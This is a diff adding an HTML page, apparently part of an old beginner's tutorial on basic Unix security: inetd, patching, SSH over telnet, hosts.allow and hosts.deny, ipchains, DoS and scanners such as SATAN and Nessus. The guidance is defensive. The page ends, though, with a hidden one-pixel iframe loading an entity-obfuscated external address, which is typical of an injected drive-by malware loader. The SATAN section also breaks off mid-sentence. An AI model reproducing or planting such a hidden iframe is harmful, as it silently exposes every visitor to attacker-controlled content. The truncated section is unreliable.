+<p>Example #3: A firewall is also a network daemon. Firewalls are programs that 
+  filter incoming and outgoing network packets. They awake once a network event 
+  occurs, and decide whether to allow or disallow it.</p>
+<p>Now, let's think. Suppose you have twelve different network daemons on your 
+  system. That would take up too much memory for us, right? Then why not just 
+  have a single daemon to do all the ditry work for us and consume less memory? 
+  This is where INetD comes into the picture.</p>
+<p>INetD stands for InterNet Daemon. You can configure inetd by editing /etc/inetd.conf 
+  (conf stands for configurations). This file should contain instructions on how 
+  to edit it.</p>
+<p><b><font size="4">Updating Your Network Daemons</font></b><br>
+  <br>
+  You've just got the latest version of your favorite Unix distribution. It came 
+  with an FTP daemon, which you want to run on your system so you could turn it 
+  into an FTP server. But then, someone discovers a hole within this FTP daemon, 
+  and a new version with a fix for this problem goes out. You don't wanna get 
+  caught with your pants down, running an old and buggy FTP daemon, right? Hell, 
+  you could get cracked by some script kiddie and lose your entire hard drive! 
+  We don't want THAT to happen, now do we?</p>
+<p>First of all, you need to know when a new hole is discovered. You should watch 
+  packetstorm.securify.com on a daily basic, and also subscribe to the BugTraq 
+  mailing list (securityfocus.com). You should also look for mailing lists concerning 
+  the network daemons (also referred to as network services) you are using.</p>
+<p>Then, once there are new versions of the network daemons you use, you should 
+  download the latest version and update the files on your system.</p>
+<p><b><font size="4">Network Sniffers</font></b><br>
+  <br>
+  For an excellent paper on network sniffers (what are they, how can they risk 
+  your computer's security and how to fight against them), read this excellent 
+  paper: blacksun.box.sk/sniffer.txt.</p>
+<p><b><font size="4">DO NOT Use Telnetd!</font></b><br>
+  <br>
+  DO NOT run the telnet daemon on your system! If you want people to be able to 
+  remotely login to your system and run commands on your system, DO NOT use telnet 
+  for this purpose.</p>
+<p>Instead, you should use SSH (SSH stands for Secure SHell). SSH encrypts your 
+  sessions, so it'll be harder for intruders to eavasdrop you and/or capture any 
+  passwords you enter.</p>
+<p>Of course, you have to use a special client for SSH, since SSH is very different 
+  than telnet, because of the following reasons:</p>
+<p>A) SSH encrypts your sessions. Telnet merely creates plain-text TCP sessions. 
+  B) SSH runs on port 22 by default, while telnet stays on port 23. Although almost 
+  every telnet application in existence allows you to create telnet sessions with 
+  any remote host and port specified, some telnet applications still use port 
+  23. Anyway, ALL telnet applications have port 23 as their default, so if you 
+  type telnet some-host or telnet some-ip, it'll telnet to that host/IP and into 
+  port 23.</p>
+<p>Get sshd and ssh clients at packetstorm.securify.com, securityfocus.com, linux.box.sk, 
+  astalavista.box.sk etc'.</p>
+<p><b><font size="4">Basic Packet Filtering</font></b><br>
+  <br>
+  First, find these two files: /etc/hosts.allow and /etc/hosts.deny. These two 
+  files can be used to form a basic packet filtering system. Let's start with 
+  /etc/hosts.deny first.</p>
+<p>Each line in this file should look like this: host:service</p>
+<p>Host - a hostname or an IP. You can also use wildcards. For example: *.aol.com 
+  would stand for every host that has a hostname that ends with aol.com.</p>
+<p>Service - what network service(s) do you want to allow/deny to this host? Services 
+  are defined by their port number. You can also put ALL instead to block of EVERY 
+  well-known port to this host (a well-known port is any port between 0 and 1024. 
+  These ports are called well-known ports because each one has a default network 
+  service associated with it. For example: port 23 is the default for telnet, 
+  port 21 is the default for FTP, port 25 is the default for Sendmail, port 110 
+  is the default for POP3 etc').</p>
+<p>Each line within this file represents a combination of a host and a port(s) 
+  that you don't want this host to be able to access. This is called basic packet 
+  filtering.</p>
+<p>Now, the /etc/hosts.allow file works exactly like hosts.deny, only it contains 
+  hosts that you want to allow access to. Here are a few examples of why you would 
+  need such a thing:</p>
+<p>Example #1: You want to block every well-known port to AOL users besides port 
+  21, so they could access your FTP server. To do this, you put *.aol.com:all 
+  in your hosts.deny file and then *.aol.com:21 in your hosts.allow file. As you 
+  can see, hosts.allow has a higher priority than hosts.deny.</p>
+<p>Example #2: You want to block off AOL users from your FTP server on port 21, 
+  besides foobar.aol.com, which is actually quite nice and always has something 
+  interesting to contribute to your FTP collection. To do this, you put *.aol.com:21 
+  in hosts.deny and foobar.aol.com:21 in your hosts.allow file.</p>
+<p><b><font size="4">Advanced Packet Filtering</font></b><br>
+  <br>
+  Yup... firewalls.</p>
+<p>Firewalls are programs that watch everything that comes in and out of your 
+  network or personal computer, and decide what to allow and what to block. Out 
+  of their nature, firewalls need root-priviledges to run (or admin priviledges 
+  on NT networks).</p>
+<p>Firewalls usually come with a set of premade rules files. Rules files are files 
+  with rules on what to allow and what to deny. These rules files can block DoS 
+  attacks and relatively popular methods of hacking. Also, most firewalls come 
+  with a 'learning mode' option, which is a way of defining your rules as you 
+  go on (whenever something comes in or out, you are asked to either allow or 
+  deny it, and the firewall adapts itselfs to your preferences).</p>
+<p>One of the best firewalls for Unix (and one of the best firewall in the world) 
+  is IP Chains. Search for the latest version at packetstorm.securify.com (search 
+  for ipchains, not ip-chains or ip chains or anything. Otherwise, you probably 
+  won't find anything), securityfocus.com or linux.box.sk.</p>
+<p>For help using ipchains (ipchains isn't exactly the most user-friendly firewall 
+  in existence), get some ipchains howtos (a howto is a document on how to do 
+  something or how to use something), which probably come with the ipchains package 
+  anyway, together with the executables, the configurations<br>
+  files etc'. These howtos should help you a lot. You should also get a front-end 
+  for ipchains if you're a first-time user.</p>
+<p>Some people will argue and claim that other packet filtering firewalls, such 
+  as BSD's ipfilter, are better than ipchains. However, I still consider ipchains 
+  as my firewall of choice.</p>
+<p><b><font size="4">DoS Attacks</font></b><br>
+  <br>
+  DoS stands for Denial of Service. DoS attacks deny access to a certain service 
+  for a certain person. DoS attacks can crash your computer, disconnect you, crash 
+  your web server programs, SMTP server programs, POP3 server programs etc', disallow 
+  you access to your Email account (a mailbomb (flooding someone with enormous 
+  amounts of Emails. Usually done with some sort of a program which<br>
+  automates this progress) is also considered a DoS attack (although somewhat 
+  privitive) because it fills up your mailbox and denies you access to it), block 
+  certain remote services and in general anything you can think of that will deny 
+  you access to something.</p>
+<p>To protect yourself against DoS attacks, I recommend either:</p>
+<p>a) Getting a good firewall (see previous section).<br>
+  b) Subscribing to security mailing lists and checking online databases<br>
+  frequently to get the latest versions of everything and all the latest patches.</p>
+<p><b><font size="4">Security Scanners</font></b><br>
+  <br>
+  Security scanners automatically test the security of a network by attempting 
+  to crack into it in different popular ways. It is advised to run one on your 
+  network or home PC (unless you don't run any services on your system, which 
+  makes your system much less vulnerable, in which case there is no need to be<br>
+  so paranoid. Just avoid default configurations and read all the rest of the 
+  sections and you're pretty much safe) to test it's security, although just running 
+  one isn't enough to secure oneself (follow the rest of the instructions in this 
+  text and read some other texts and books. This text is in no way complete (ahem... 
+  the name is BASIC Local/Remote Unix Security). Try some of the stuff at blacksun.box.sk's 
+  books page).</p>
+<p>In the next part, I will review some of the best scanners available at the 
+  time this tutorial was written, although not in much depth and detail, since 
+  I am limited in size and time.</p>
+<p><b><font size="4">The Scanners</font></b><br>
+  <br>
+  Remote security scanners test the security of a remote network or computer over 
+  a LAN (Local Area Network), a WAN (Wide Area Network, such as the Internet) 
+  or any other kind of network.</p>
+<p><font size="4"><b>SATAN</b></font><br>
+  <br>
+  Author: Dan Farmer and Weitse Venema.<br>
+  Language written in: C and Perl.<br>
+  Platform built on: some version of Unix.<br>
+  Requirements: Unix, Perl 5.001+, C, IP header files and root access on the system 
+  you intend to run Satan from.</p>
+<p>Satan stands for Security Administrator's Tool for Analyzing Networks). It 
+  is the first security scanner that is actually user-friendly. It is built as 
+  a website, where you can choose attacks using simple forms, pulldown boxes, 
+  radio boxes and check boxes, and it displays all the output in an easily-readable 
+  form, ready for printing.</p>
+<p>Satan also includes a short and easy-to-understand tutorial on each attack, 
+  which makes it an excellent source for security study for beginners. If you're 
+  interested in network security, it is advised to get Satan and try running it 
+  on your computer and scanning your friends (DO NOT scan systems you are not 
+  allowed to scan! It is illegal!).</p>
+<p>If you prefer the command-line approach, Satan can also be run using a simple 
+  command-line-based interface.</p>
+<p>Satan can be obtained from the following URL: http://www.trouble.org/~zen/satan/satan.html</p>
+<p>As far as I know, there are no Windows NT and Macintosh versions of Satan, 
+  but I havn't checked for a long time now. I expect that there should be a Windows 
+  NT version soon, if there isn't one already.</p>
+<p>If you're using any version of Linux, you must make several modifications to 
+  run Satan on your system (the next part has been copied from some website. I 
+  forgot the website's URL, but I'm not going to credit these folks anyway, since 
+  I am sure they have stolen this from some book... forgot the book's name, though...):<br>
+  a) The file tcp_scan makes incompatible select() calls. To fix this problem,</p>
+<p><b><font size="4">Nessus</font></b><br>
+  <br>
+  Author: Renaud Deraison.<br>
+  Language written in: C.<br>
+  Platform built on: Linux.<br>
+  Requirements: Linux (most non-Linux distributions will also run it, though, 
+  since they all can emulate each other's programs), C, X-Windows and GTK (the 
+  version of GTK you will need depends on the version of Nessus you intend to 
+  run).</p>
+<p>Nessu is another excellent remote security scanner. Has a user-friendly graphical 
+  user interface and relatively fast scans. Get Nessus from the following URL: 
+  <a href="http://www.nessus.org" target="_blank">http://www.nessus.org</a></p>
+<p><b><font size="4">IdentTCPScan</font></b><br>
+  <br>
+  Author: Dave Goldsmith.<br>
+  Language written in: C.<br>
+  Platform built on: Unix.<br>
+  Requirements: Unix, C, IP header files.</p>
+<p>IdentTCPScan has a very useful ability: what it does is that it portscans it's 
+  target (determines which ports are open on the target host), tells you what 
+  service is probably running on this port and tells you which user is running 
+  it by his UID.</p>
+<p>This can reveal some interesting holes. For example: if it discovers that some 
+  network or computer is running their web server as UID 0 (remember? UID 0 = 
+  root access), this is a serious security hole! If some malicious attacker exploits 
+  a hole in, say, one of the CGIs on this website, he could access ANY file on 
+  the system, since the web server runs as root, hence is not limited with access. 
+  Web servers should run on users that have limited access (in this case, the 
+  web server should only have access to the files contained in the website and 
+  to it's own files, of course).</p>
+<p>Unfortunately, I don't have an up-to-date URL. Try searching packetstorm.securify.com 
+  or securityfocus.com.</p>
+<p></p>
+<p><font size="4"><b>Appendix A: Security Checklists</b></font><br>
+  <br>
+  Here are some URLs for &quot;security checklists&quot; - papers that explain 
+  about various actions that need to be taken in order to increase your box'ssecurity.</p>
+<p>Unix Computer Security Checklist<br>
+  Author: AUCERT<br>
+  URL: <a href="http://www.bive.unit.liu.se/security/AUSCERT_checklist1.1html" target="_blank">http://www.bive.unit.liu.se/security/AUSCERT_checklist1.1html</a></p>
+<p>Generic Password Security Checklist<br>
+  Author: Lindsay Winsor<br>
+  URL: <a href="http://delphi.colorado.edu/%7Esecurity/users/access/goodprac.htm" target="_blank">http://delphi.colorado.edu/~security/users/access/goodprac.htm</a></p>
+<p>CERT Coordination Center Generic Security Information Checklist<br>
+  Author: CERT<br>
+  URL: <a href="http://ird.security.mci.net/check/cert-sec.html" target="_blank">http://ird.security.mci.net/check/cert-sec.html</a></p>
+<p>TCP/IP Security Checklist<br>
+  Author: Dale Drew<br>
+  URL: <a href="http://ird.security.mci.net/check.html" target="_blank">http://ird.security.mci.net/check.html</a></p>
+<p>Security Policy Checklist*<br>
+  Author: Barbara Guttman and Robert Bagwill<br>
+  URL: <a href="http://csrc.nist.gov/isptg/html/ISPTG-Contents.html" target="_blank">http://csrc.nist.gov/isptg/html/ISPTG-Contents.html</a></p>
+<p>* Why would you want to establish a written security policy? Because if you're 
+  running an office network or some other kind of widely-used network and you 
+  plan to sue anyone who would hurt or try to hurt the integrity of your network 
+  than a written and published security policy would be the first thing you'll 
+  need in order to sue.</p>
+<p><b><font size="4">Appendix B: Using Different Loggers</font></b><br>
+  <br>
+  Suppose your network or home PC have been compromised and broken into. What's 
+  next? Surely you would like to sue the bastard, or at least find out how exactly 
+  they got in. Or perhaps someone is inside your system right now and you want 
+  to look for anything suspicious.<br>
+  For any of the two, you will need the kind of evidence found in log files. But 
+  what if the attacker has erased all forms of evidence of his mischevious acts 
+  (which is very probable)? Most attackers will do that using automated log cleaners, 
+  which will delete their presense from the log files. But what if you're using 
+  something the attacker nor the creator of the log cleaner hasn't been expecting? 
+  I'm talking about another logger, which the automated tool will not detect and 
+  mess with. If you are using another logger or a modified logger, it is most 
+  likely that script kiddies won't notice it, and only real crackers will notice 
+  it and get read of their presense in your logs. This will increase the chance 
+  that you will get to keep your logs.</p>
+<p>&nbsp;</p>
+<hr width="75%" align="center">
+<p></p>
+<p>That's about all for this time, folks. As I have already stated in the introduction 
+  (actually, the next part was copied and pasted from the introduction chapter): 
+  &quot;I included everything I could possibly think of (that is notable for a 
+  beginners guide in this field, of course). With time, I will add more chapters, 
+  so make sure you have the latest version by visiting blacksun.box.sk often or 
+  subscribing to Black Sun's mailing list (info on how to subscribe at blacksun.box.sk 
+  also).&quot;</p>
+<p>Oh, by the way, some of you might have been expecting me to mention the r* 
+  services (rcp, rlogin, rsh etc'), which don't exactly have perfect security. 
+  Well, I was thinking of writing a tutorial completely devoted to them. If you're<br>
+  interested, you could go to blacksun.box.sk right now and see if it's already 
+  done (if it's not, most chances are that because there are other tutorials scheduled 
+  ahead of it).</p>
+<p><b>&lt;--! Begin copyright bullshit !--&gt; </b><br>
+  All copyrights are reserved. You may distribute this tutorial freely, as long 
+  <br>
+  as you keep our names and Black Sun Research Facility's URL at the top of this 
+  <br>
+  tutorial. <br>
+  I have written this tutorial for you, the readers. But I also wish to remain 
+  <br>
+  the author of this guide, meaning I do not want people to change a line or two 
+  <br>
+  and then claim that the whole guide is theirs. If you wish to create an <br>
+  altered version of this tutorial, please contact me by Email - <br>
+  <a href="mailto:barakirs@netvision.net.il">barakirs@netvision.net.il</a>. <br>
+  <b>&lt;--! End copyright bullshit !--&gt;</b></p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
